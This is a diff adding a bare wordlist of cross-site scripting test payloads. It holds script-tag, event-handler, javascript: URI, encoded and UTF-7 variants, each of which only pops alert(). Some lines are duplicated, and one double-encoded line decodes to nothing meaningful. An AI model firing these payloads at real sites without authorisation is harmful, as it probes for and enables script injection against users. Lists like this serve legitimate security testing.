@@ -1,0 +1,24 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+');alert('XSS');// or ");alert('XSS');// or `);alert('XSS');//
+%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+" onmouseover="alert('XSS')
+javascript:alert('XSS');
+';alert('XSS');// or ");alert('XSS');// or `);alert('XSS');//
+document.write(location.href);
+<svg/onload=alert('XSS')>
+"><img/src/onerror=alert('XSS')//>
+img="onerror=alert('XSS')"
+?img=%22%20onerror%3D%22alert('XSS')%22
+?redirect=javascript:alert('XSS')
+?redirect=javascript%3Aalert%28'XSS'%29
+?redirect=javascript:alert('XSS')
+" onmouseover="alert('XSS')
+;alert('XSS');
+%25%33%63%25%33%65%25%33%32%25%32%30%25%36%32%25%36%31%25%36%32%25%32%32%25%32%30%25%33%63%25%33%65%25%33%32
+" onclick="alert(1)
+javascript:alert(1)
++ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+';alert(1);//
+
